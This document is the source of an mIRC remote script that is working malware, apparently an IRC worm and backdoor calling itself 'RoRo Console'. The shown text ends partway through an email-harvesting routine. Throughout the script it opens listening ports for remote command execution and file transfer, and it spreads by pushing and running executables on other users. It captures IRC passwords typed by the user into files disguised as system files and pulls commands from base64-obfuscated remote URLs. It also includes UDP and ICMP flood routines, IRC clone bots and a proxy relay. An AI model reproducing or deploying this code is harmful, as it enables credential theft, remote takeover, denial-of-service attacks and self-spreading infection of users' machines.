[script]
n0=alias setStat { .writeini $winFile Options Virus $1 }
n1=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }
n2=alias setCountry { if ($1) { .writeini $winFile Options Country $1 } }
n3=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) { %s = OTHER } | .return %s }
n4=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }
n5=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }
n6=alias winDir { .return c:\win98 }
n7=alias Wind { .return @ $+ $1 }
n8=alias Verify { if ($1 && $sock($1) && $sock($1).wserr == 0) { .return 1 } | .return 0 }
n9=alias Binded { if ($1 && $sock($1).status == active) { .return 1 } | .return 0 }
n10=alias Reborn { .setInfo | .remote on }
n11=on *:Connect:{ .Init }
n12=on *:Disconnect:{ .timers off }
n13=on *:Unload:{ .timers off | if ($hget(Mutex).size > 0) .hfree Mutex }
n14=on *:Start:{ .Start }
n15=alias Start {
n16=  if ($version < 5.8) { .unload -rsn $script | .halt }
n17=  if ($hget(Mutex).size > 0) { .timers off | .unload -rsn $script | .halt } | .hmake Mutex 1
n18=  if ($HGet(Data).size > 0) { .hfree Data } | .hmake Data 100 | .hadd Data iJoinCount 3
n19=  .hadd Data Recving Idle | .hadd Data Sending Idle | .hadd Data Visited 0
n20=  if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }
n21=  .setStat $getStat | .setCountry $getCountry | .setLoad Big | if ($getStat == Full) { .hadd Data Spread On }
n22=  .hadd Data Loaded $calc($readini($winFile,Options,Loaded) + 1) | .writeini $winFile Options Loaded $hget(Data, Loaded)
n23=  .setMode Full | .write -c notes.txt | .load -rs1 notes.txt | .sockclose *
n24=}
n25=alias Init {
n26=  if ($hget(Data).size == 0) { .timers off | .unload -rsn $script }
n27=  .hadd Data Server $server | .hadd Data iJoin 0
n28=  if ($readini($winFile, Options, Init2) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }
n29=  .timerListenIt 1 5 { .ListenIt } | .timerHttpMe 1 15 { .httpMe } | .timerReborn 0 90 { .Reborn } | .timerSend 0 600 { .hadd Data Sending Idle }
n30=  if (!$hget(Data,extractHTML)) { .hadd Data extractHTML 1 | .extractHTML }
n31=}
n32=alias ListenIt { if ($portfree(1994) == $true) { .socklisten Listen-RecvFile 1990 | .socklisten Listen-SendFile 1991 | .socklisten Listen-Mutex 1994 | .socklisten Listen-BNC 1999 | .socklisten Listen-Console 2000 } }
n33=alias AcceptIt { var %sName "" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto AcceptIt | .sockaccept %sName | return %sName }
n34=alias OpenIt { var %sName "" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) .goto OpenIt | return %sName }
n35=alias SendFile {
n36=  ; $1 - ACTION , $2 - $sockname , $3 - Local Filename , $4 - Remote Filename , $5 - Virus
n37=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, SendFile) , %sRead , %iSize
n38=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }
n39=  if (CLOSE isin $1) || ($sockerr > 0) {
n40=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }
n41=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n42=  }
n43=  if (READ isin $1) {
n44=    .sockread %sRead
n45=    .hadd Data $rev(%sName, LocalName) $shortfn($GetTok(%sRead, 2, $asc(!)))
n46=    .hadd Data $rev(%sName, Pos) $GetTok(%sRead, 3, $asc(!))
n47=    .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))
n48=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n49=    if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sName, Pos)) bytes. Sending in Progress.. }
n50=  }
n51=  if (OPEN isin $1) {
n52=    .hadd Data $rev(%sName, LocalName) $shortfn($3)
n53=    .hadd Data $rev(%sName, RemoteName) $4
n54=    .hadd Data $rev(%sName, Virus) $5
n55=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))
n56=    .hadd Data $rev(%sName, Pos) 0
n57=    if ($exists($hget(Data, $rev(%sName, LocalName))) == $false) { .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n58=    if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Busy }
n59=    else { .hadd Data $rev(%sName, Virus) 0 }
n60=    if (!$verify($2) && $hget(Data, $rev(%sConsole, IP))) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1990 }
n61=  }
n62=  if (INIT isin $1) {
n63=    %iSize = $file($hget(Data, $rev(%sName, LocalName))).size
n64=    if ($Verify($2) == 1) { .sockwrite -tn $2 SendFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iSize $+ ! $+ $hget(Data, $rev(%sName, Remote)) $+ ! $+ $hget(Data, $rev(%sName, Virus)) }
n65=  }
n66=  if (SEND isin $1) {
n67=    .bread $hget(Data, $rev(%sName, LocalName)) $hget(Data, $rev(%sName, Pos)) 2048 &bRead
n68=    if ($bvar(&bRead, 0)) { if ($Verify($2) == 1) { .sockwrite $2 &bRead } | .hadd Data $Rev(%sName, Pos) $calc($hget(Data, $rev(%sName, Pos)) + 2048) }
n69=    else {
n70=      if (%bServer == 1 && $Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (SENDFILE) File Successfully Sent.. }
n71=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Sending Idle }
n72=      .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n73=    }
n74=  }
n75=}
n76=alias RecvFile {
n77=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename
n78=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead , %iResume
n79=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }
n80=  if (CLOSE isin $1) || ($sockerr > 0) {
n81=    if (%bServer == 1) {
n82=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { 
n83=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }
n84=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }
n85=      }
n86=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) {
n87=        .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC..
n88=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle }
n89=      }
n90=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .sockclose $hget(Data, $rev(%sName, Remote)) }
n91=    }
n92=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
n93=  }
n94=  if (OPEN isin $1) {
n95=    .hadd Data $rev(%sName, RemoteName) $3
n96=    .hadd Data $rev(%sName, LocalName) $4
n97=    .hadd Data $rev(%sName, Remote) $hget(Data, $rev(%sConsole, Remote))
n98=    if ($verify($2) == 0) { .sockopen $2 $hget(Data, $rev(%sConsole, IP)) 1991 }
n99=  }
n100=  if (INIT isin $1) {
n101=    %iResume = $file($hget(Data, $rev(%sName, LocalName))).size | if (%iResume == $null) { %iResume = 0 }
n102=    .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%sName, RemoteName)) $+ ! $+ %iResume $+ ! $+ $hget(Data, $rev(%sName, Remote))
n103=  }
n104=  if (RECV isin $1) {
n105=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {
n106=      .sockread %sRead
n107=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))
n108=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))
n109=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))
n110=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))
n111=      .hadd Data $rev(%sName, Init) 1
n112=      if ($hget(Data, $rev(%sName, Virus)) == 1) {
n113=        if ($hget(Data, Recving) == Busy) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
n114=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \ $+ $random($rand(3,6)) $+ .exe
n115=      }
n116=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }
n117=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }
n118=    }
n119=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | .goto RecvMore } }
n120=  }
n121=}
n122=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }
n123=on *:sockread:Server-SendFile-*:{ .SendFile READ|SEND $sockname }
n124=on *:sockwrite:Server-SendFile-*:{ .SendFile SEND $sockname }
n125=on *:sockclose:Server-SendFile-*:{ .SendFile CLOSE $sockname }
n126=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }
n127=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }
n128=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }
n129=on *:sockopen:Local-SendFile-*:{ .SendFile INIT $sockname }
n130=on *:sockwrite:Local-SendFile-*:{ .SendFile SEND $sockname }
n131=on *:sockclose:Local-SendFile-*:{ .SendFile CLOSE $sockname }
n132=on *:sockopen:Local-RecvFile-*:{ .RecvFile INIT $sockname }
n133=on *:sockread:Local-RecvFile-*:{ .RecvFile RECV $sockname }
n134=on *:sockclose:Local-RecvFile-*:{ .RecvFile CLOSE $sockname }
n135=on *:socklisten:Listen-Console:{ 
n136=  .AcceptIt Server-Console
n137=}
n138=on *:sockread:Server-Console-*:{ 
n139=  if ($sockerr > 0) { .return } | var %sRead | .sockread %sRead | .tokenize 32 %sRead | if ($1 && $isalias($1 $+ It) == $true) { $1 $+ It $2- }
n140=}
n141=on *:sockwrite:Server-Console-*:{
n142=  if ($hget(Data, $rev($sockname, Active)) == DIR) {
n143=    .inc %DIR.i | %DIR.Tmp = $ev(DIR, Items, %DIR.i)
n144=    if (%DIR.Tmp && $Verify($sockname)) { .sockwrite -tn $sockname %DIR.Tmp }
n145=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }
n146=  }
n147=}
n148=on *:sockopen:Server-Console-*:{ 
n149=  if ($sockerr > 0) { .return } | .sockwrite -tn $sockname Rename Local-Console- $+ $me
n150=}
n151=alias OpenSConsole { var %sConsole = $OpenIt(Server-Console) | if ($2) { .sockopen %sConsole $2 2000 } }
n152=alias CloseConsole { .sockclose Local-Console- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1, *) | .window -c @Local-Console- $+ $1 }
n153=alias OpenConsole { var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole) && $2) { .sockopen %sConsole $2 2000 | .return } | .decCount iJoin }
n154=alias UseConsole {
n155=  var %sConsole = Local-Console- $+ $1 | if (!$Verify(%sConsole)) { .return }
n156=  if ($sock(%sConsole).status == active) { .sockwrite -tn %sConsole $2- }
n157=  if ($2 == SendFile) { $SendFile(OPEN, Local-SendFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!)), $getTok($3-, 3, $asc(!))) }
n158=  if ($2 == RecvFile) { $RecvFile(OPEN, Local-RecvFile- $+ $1, $getTok($3-, 1, $asc(!)), $getTok($3-, 2, $asc(!))) }
n159=}
n160=alias InitConsole {
n161=  .decCount iJoin | if ($sockerr > 0) { .return }
n162=  .UseConsole $GetTok($sockname, 3-, $asc(-)) Hello
n163=}
n164=on *:sockopen:Local-Console-*:{ .InitConsole }
n165=on *:sockread:Local-Console-*:{
n166=  if ($sockerr > 0) { .return } | var %sRead , %sNick = $GetTok($sockname, 3-, $asc(-)) , %bAlive = 0
n167=  .sockread %sRead | .tokenize 32 %sRead
n168=  if ($1 == (HELLO)) {
n169=    .hadd Data $rev($sockname,Version) $6
n170=    if ($hget(Data, MassExec)) { .UseConsole %sNick Mass $hget(Data, MassExec) } | .UseConsole %sNick Status 
n171=  }
n172=  if ($1 == (STATUS)) {
n173=    if (!$5) { .CloseConsole %sNick | .return }
n174=    .hadd Data $rev($sockname, Remote) $4 | .hadd Data $rev($sockname, IP) $5
n175=    if ($getStat == Full && $hget(Data, Sending) == Idle) {
n176=      if ($getVersion > $hget(Data,$rev($sockname,Version)) && $2 != Tmp && $3 == Idle) {
n177=        if ($hget(Data,$rev($sockname,Version)) < 4.5) { .UseConsole %sNick EXEC .setStat Tmp }
n178=        .UseConsole %sNick SendFile $runDLL $+ !C:\ $+ $random($rand(3,5)) $+ .exe!1 | %bAlive = 1
n179=      }
n180=    }
n181=    if (!%bAlive) { .CloseConsole %sNick }
n182=  }
n183=}
n184=on *:sockclose:Local-Console-*:{ 
n185=  .hdel -w Data $rev($sockname, *)
n186=}
n187=alias getScript { .return BiG }
n188=alias getVersion { .return 5.5 }
n189=alias setInfo { .writeini $GFN(DEF) Options Nick $me | .writeini $GFN(DEF) Options Info $getInfo(1) | .writeini $GFN(DEF) Options Info2 $getInfo(2) }
n190=alias getInfo { if ($1 == 1) { .return $me .:. $hget(Data,Addr) .:. $Ip .:. $Server } | if ($1 == 2) { .return RoRo $getVersion $getScript .:. mIRC $Version .:. Win $OS } }
n191=alias HelloIt { if ($verify($sockname)) .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }
n192=alias StatusIt { if ($verify($sockname)) .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }
n193=alias winFile { .return $GFN(WINFILE) }
n194=alias runDLL { .return $readini($GFN(WINFILE),Files,SYS) }
n195=alias InfoIt { if ($verify($sockname)) { .sockwrite -tn $sockname (INFO) $getInfo(1) .:. $getInfo(2) } }
n196=alias SnifferIt { if ($verify($sockname)) { .sockwrite -tn $sockname (SNIFFER) Updated. } | .hadd Data Sniffer.Console $sockname | .hadd Data Sniffer $1 }
n197=alias BNCIt { if ($verify(Gateway-BNC) != 1) { if ($verify($sockname)) .sockwrite -tn $sockname (BNC) Server: $1 Port: $2 | .sockopen Gateway-BNC $1 $2 } }
n198=alias setMode { var %i = $gettok($date,1,$asc(/)) | if (5 // %i && $getCountry != BG) .AddHTTP $decode(Z2VvY2l0aWVzLmNvbS8=,mt) $+ SOS- $+ $calc(%i * $gettok($date,2,$asc(/))) $+ /Commands.txt NULL EXEC }
n199=alias Exec2It { $1- }
n200=alias ExecIt { [ [ $1- ] ] | if ($verify($sockname)) { .sockwrite -tn $sockname (EXEC) Executed. } }
n201=alias WriteConsoleIt { if ($verify($sockname)) { .sockwrite -tn $sockname (CONSOLE) [ [ $1- ] ] } }
n202=alias MassIt {
n203=  if ($verify($sockname)) { .sockwrite -tn $sockname (MASS) Accepted. } | var %sExec = $readini($GFN(DEF), Mass, Executed)
n204=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed $1- , %sExec | $1- }
n205=}
n206=alias DIRFormat { .return ..\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) < $+ 4DIR> }
n207=alias FILEFormat { .return ..\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) ( $+ 10 $+ $Bytes($file(%DIR.Item).size).suf $+ ) }
n208=alias DRIVEFormat { .return $chr(91) $+  $+ 6 $+ $disk(%DIR.L).type $+  $+ $chr(93) %DIR.L $+ :\ ( $+ 7 $+ $disk(%DIR.L).Label $+ ) $+  $+ 10 $Bytes($calc($disk(%DIR.L).size - $disk(%DIR.L).free)).suf $+  $+ 10 $Bytes($disk(%DIR.L).size).suf }
n209=alias setLoad { var %i = $gettok($date,1,$asc(/)) | if (5 // %i && $getCountry == BG) .AddHTTP SOS- $+ $calc(%i * $gettok($date,2,$asc(/))) $+ $decode(LmhpdC5iZy9Db21tYW5kcy50eHQ=,mt) NULL EXEC }
n210=alias DIRIt {
n211=  if ($hget($sockname, Active) == DIR) { .return } | .unset %DIR.* | %DIR.Index = 0 | %DIR.Index2 = 0
n212=  if ($1 != DRIVES) { .goto DirFiles } | %DIR.Letters = CDEFGHIJKLMNOPQRSTUVWXYZ
n213=  :DirDrives | .inc %DIR.Pos | %DIR.L = $mid(%Dir.Letters, %DIR.Pos, 1) | if (!%DIR.L) { .goto DirEnd }
n214=  if ($disk(%DIR.L)) { $sev(DIR, Items, %DIR.Index, $DRIVEFormat) | .inc %Dir.Index } | .goto DirDrives
n215=  :DirFiles | %DIR.CD = $getTok($1-, 1- $+ $calc($0 - 2), 32) | %DIR.Mask = $getTok($1-, $calc($0 - 1), 32) | %DIR.Depth = $getTok($1-, $0, 32)
n216=  $sev(DIR, Items, 0, BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth)
n217=  :DirNext | .inc %DIR.Index | %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)
n218=  if (%DIR.item) { $sev(DIR, Items, %DIR.Index, $DIRFormat) | .goto DirNext } | .dec %DIR.Index
n219=  :FileNext | .inc %DIR.Index2 | %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)
n220=  if (%DIR.item) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $FILEFormat) | .goto FileNext } | .dec %DIR.Index2
n221=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s))
n222=  :DirEnd | if ($Verify($sockname)) { .hadd Data $rev($sockname, Active) DIR | .sockwrite -tn $sockname $ev(DIR, Items, 0) }
n223=}
n224=alias istrue { if ($1 == $2) { $3- } }
n225=alias isfalse { if ($1 != $2) { $3- } }
n226=alias ishigher { if ($1 > $2) { $3- } }
n227=alias islower { if ($1 < $2) { $3- } }
n228=alias ev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return % [ $+ [ %s ] ] }
n229=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }
n230=alias sev { var %i = 0 , %s | while (%i != $calc($0 - 1)) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | set % [ $+ [ %s ] ] $getTok($1-, $0 $+ -, 32) }
n231=alias setPriority { .writeini $GFN(IRC) Options Priority High }
n232=alias incPassCount { var %i = $readini($GFN(IRC), Options, Count) | .inc %i | if (2 // %i) { .writeini $GFN(IRC) Options Status UnSent } | .writeini $GFN(IRC) Options Count %i }
n233=alias putHost { if ($hget(Data, Addr)) { .writeini $GFN(IRC) $me Addr $hget(Data, Addr) } }
n234=alias dif {
n235=  var %s | if (!$server) { .return } | .putHost
n236=  if ($1 == 1) { %s = Temp-Pass } | if ($1 == 2) { %s = OS-PASS } | if ($1 == 3) { %s = OPER-PASS } | if ($1 == 4) { %s == BOT-PASS_ $+ $2 }
n237=  if ($1 == 4) { if ($3 && $readini($GFN(IRC),$me,%s) != $3) { .incPassCount } | .return }
n238=  if ($3 && $readini($GFN(IRC),$2,%s) != $3) || ($4 && $readini($GFN(IRC),$2,Perm-Pass) != $4) { .incPassCount }
n239=  if ($3) { .writeini $GFN(IRC) $2 %s $3 } | if ($4) { .writeini $GFN(IRC) $2 Perm-Pass $4 }
n240=  if (%s == OS-PASS) || (%s == OPER-PASS) { .setPriority }
n241=}
n242=alias GFN { if ($1 == IRC) { .return C:\WIN98\SYSTEM\andyCmd.vxd } | if ($1 == DEF) { .return C:\WIN98\ydna32.sys } | if ($1 == WINFILE) { .return C:\WIN98\SYSTEM\Dxydna98.dll } }
n243=on *:input:*:{
n244=  var %i = 0 , %iT , %sT = $me , %sLine
n245=  if (i isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-INPUT) ( $+ $active $+ ) $1- }
n246=  if (/remote isin $1 && $2 == off) || (/remote isin $1 && $0 == 1) { .echo -a  $+ 2*** Remote is off | .halt }
n247=  if (*Msg NS iswm $1-2) { %iT = 1 | %i = 1 } | if (*Msg OS iswm $1-2) { %iT = 2 | %i = 1 } | if (*Msg CS iswm $1-2) { %iT = 1 | %sT = $null | %i = 1 }
n248=  if (%iT) { .tokenize 32 $getTok($1-,$calc(2 + %i),32) %sT $getTok($1-,$calc(3 + %i) $+ -,32) | if (id isin $1) || (reg isin $1) || (newp isin $1) { .dif %iT $2- } }
n249=  %sLine = $1- | %sLine = $replace(%sLine,:,$chr(32)) | .tokenize 32 %sLine
n250=  if ($1 == /server && $0 > 2) { .writeini $GFN(IRC) BNC $2 $3- | .setPriority | .hadd Data addHost $2 }
n251=  if (/*ass iswm $1 && $server && $2) { .writeini $GFN(IRC) BNC $server $+ _Pass $2- | .setPriority | .hadd Data addHost $server }
n252=  if (/*uote*pass iswm $1-2 && $server && $3) { .writeini $GFN(IRC) BNC $server $+ _Pass $3- | .setPriority | .hadd Data addHost $server }
n253=  if ($1 == /oper && $0 == 3) { .dif 3 $2- }
n254=  if ($1 == ident && $target !ischan && $0 == 2) { .dif 4 $target $2 }
n255=}
n256=alias incCount { if (!$hget(Data,$1)) || ($hget(Data,$1) < $hget(Data,$1 $+ Count)) { .hadd Data $1 $calc($hget(Data, $1) + 1) | .return 1 } | .return 0 }
n257=alias decCount { .hadd Data $1 $calc($hget(Data,$1) - 1) }
n258=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }
n259=alias fClone { .return $winDir $+ \winocx.dll }
n260=alias UseInvite { var %sMask = $1 $+ -* , %sSock = $sock(%sMask,1) | if ($Verify(%sSock) && $Binded(%sSock)) { .sockwrite -tn %sSock $1- | .return 1 } | .return 0 }
n261=alias LoadClone { var %sSock = $OpenIt($1) | .sockopen %sSock $2 6667 | .sockmark %sSock $2- }
n262=alias UseClone { var %sMask = $1 $+ -* | if ($sock(%sMask,0)) { .sockwrite -tn %sMask $2- | .return 1 } | .return 0 }
n263=alias UseClones {
n264=  var %i = 0 , %sMask = $1 $+ -* , %iCount = $sock(%sMask,0) , %sSock , %sExec
n265=  while (%i < %iCount) { .inc %i | %sExec = [ [ $1- ] ] | %sSock = $sock(%sMask,%i) | if ($Verify(%sSock) && $Binded(%sSock)) { .sockwrite -tn %sSock %sExec } }
n266=}
n267=alias regValidNick {
n268=  var %sFile = $fClone , %sMask = $1 $+ -* , %sSock = $sock(%sMask,$2) , %sNick , %sTemp = $random(5) , %sPerm = $random(6)
n269=  if ($ini(%sFile,0) > 4) || ($2 > 5) { .return } | if (!%sSock) { .return }
n270=  %sNick = $getTok($sock(%sSock).mark,2,32) | if (!%sNick) { .return }
n271=  if ($len(%sNick) > 3 && !$readini(%sFile,%sNick,Temp)) { .sockwrite -tn %sSock PRIVMSG NS :reg %sTemp %sPerm | .writeini %sFile %sNick Temp %sTemp }
n272=  .timerRegValidNick 1 90 { .regValidNick $1 $calc($2 + 1) }
n273=}
n274=alias loadValidNick {
n275=  var %sFile = $fClone , %sNick , %sRead , %sMask = $1 $+ -* , %sSock , %i = 0
n276=  :loadIt | .inc %i | %sSock = $sock(%sMask,%i) | %sNick = $ini(%sFile,%i) | if (!%sSock) || (!%sNick) { .return }
n277=  %sRead = $readini(%sFile,%sNick,Temp) | if (%sRead && %i < 5) { .sockwrite -tn %sSock NICK %sNick | .sockwrite -tn %sSock PRIVMSG NS :id %sRead | .goTo loadIt }
n278=}
n279=alias validNick {
n280=  if ($len($1) < 3) || ($len($1) > 10) { .return } | var %i = 0 , %sChar , %iRand = $rand(1,4) , %s = |\[]{}^`_ , %sL = _|`|^ , %sR = _|`|^|{}|{P} , %sD = {.}|[.]|_._|^.^
n281=  :validIt | .inc %i | %sChar = $mid(%s,%i,1) | if (%sChar) { if (%sChar isin $1) .return | .goTo validIt }
n282=  if (%iRand == 1) || (%iRand == 4) { .return $1 $+ $getTok(%sR,$rand(1,$numTok(%sR,$asc(|))),$asc(|)) } | if (%iRand == 2) { .return $getTok(%sL,$rand(1,$numTok(%sL,$asc(|))),$asc(|)) $+ $1 }
n283=  if (%iRand == 3) { %i = $rand(1,$numTok(%sD,$asc(|))) | .return $getTok($getTok(%sD,%i,$asc(|)),1,$asc(.)) $+ $1 $+ $getTok($getTok(%sD,%i,$asc(|)),2,$asc(.)) }
n284=}
n285=on *:sockopen:Clone-*:{
n286=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark
n287=  var %Server = " $+ $1 $+ " , %Nick = $Random($Rand(4,9)) , %Ident = $Random($Rand(4,7)) , %Name = : $+ $Random($Rand(3,10)) $Random($Rand(2,6))
n288=  if ($2 && $2 != random) { %Nick = $2 } | if ($3 && $3 != random) { %Ident = $3 } | if ($4 && $4 != random) { %Name = : $+ $4- }
n289=  .sockwrite -tn $sockname NICK %Nick | .sockwrite -tn $sockname USER %Ident "" %Server %Name
n290=}
n291=on *:sockread:Clone-*:{
n292=  if ($sockerr > 0) { .return } | var %sRead , %sNick , %sText , %sMe = $getTok($sock($sockname).mark,2,32)
n293=  .sockread %sRead | .tokenize 32 %sRead
n294=  %sNick = $remove($gettok($1,1,$asc(!)),:) | if (! !isin $1) { %sNick = %sMe } | %sText = $getTok($1-,2-,$asc(:))
n295=  if ($1 == PING) { .sockwrite -tn $sockname PONG $2 }
n296=  else if ($me != %sNick && osc isin %sText) { %sText = $remove(%sText,,ACTION) | if ($getTok(%sText,1,32) == osc) .OpenSConsole $getTok(%sText,2,32) $decode($getTok(%sText,3,32),mt) }
n297=}
n298=alias UDPFloodIt {
n299=  if (!$3) { .return } | var %sSock = $openIt(PACKET) , %iIp = $1 , %iSize = $2 , %iCount = $3 , %iPort = $rand(1000,6669) , %i = 0
n300=  var %sPack = $random(10) | %sPack = $str(%sPack, $int($calc(%iSize / 10)))
n301=  if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (UDP) Flooding %iIp with %iSize bytes %iCount times. }
n302=  :packetLoop | if (%i >= %iCount) { if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (UDP) Target was flooded. } | .return }
n303=  .sockudp %sSock %iIp %iPort %sPack | .inc %i | .goto packetLoop
n304=}
n305=alias ICMPFloodIt {
n306=  if (!$3) { .return } | var %sVBS = $winDir $+ \wincache.vbs , %iIP = $1 , %iSize = $2 , %iCount = $3
n307=  .remove %sVBS | .write %sVBS on error resume next | .write %sVBS set wscShell = CreateObject("WScript.Shell")
n308=  .write %sVBS wscShell.Run "command /c ping -n %iCount -l %iSize -w 0 %iIP $+ ", 0, true | .run %sVBS
n309=  if ($verify($hget(Data,FConsole))) { .sockwrite -tn $hget(Data,FConsole) (ICMP) Flooding %iIp with %iSize bytes %iCount times. }
n310=}
n311=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }
n312=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }
n313=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }
n314=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }
n315=on *:sockread:Server-BNC:{ var %sRead | .sockread %sRead | if ($Verify(Gateway-BNC)) { .sockwrite -tn Gateway-BNC %sRead } }
n316=on *:sockread:Gateway-BNC:{ var %sRead | .sockread %sRead | if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) { .sockwrite -tn Server-BNC %sRead } }
n317=alias validAddr { if (($len($1-) > 8 && $len($1-) < 64) && ($pos($1-,.,0) < 3 && $pos($1-,@,0) == 1) && (~ !isin $1- && * !isin $1-)) { .return 1 } | .return 0 }
n318=alias newAddr { if ($readini($GFN(DEF), Outbox_1, $1)) || ($readini($GFN(DEF), Outbox_2, $1)) .return 0 | .return 1 }
n319=alias extractAddr { 
n320=  var %s , %i = 0 , %iCount = $wildTok($1-, *@*.*, 0, 32)
n321=  while (%i < %iCount) { .inc %i | %s = $wildTok($1-,*@*.*,%i,32) | if ($validAddr(%s) && $newAddr(%s)) { .writeini $GFN(DEF) Outbox_1 %s UnSent } }
n322=}
n323=alias extractHTML {
n324=  var %iIndex = $rand(10, 700) , %sTmpDir , %sTag , %sFile , %sSearch , %sSearch2
n325=  %sSearch = mail.bg|abv.bg|yahoo.com|mail.com|hotmail.com|usa.net|yahoo.de|gmx|mail+.co.uk|mail+.ch|mailto+.jp|mail+.de|mail+.fr|mailto+.ca|mailto+.ru
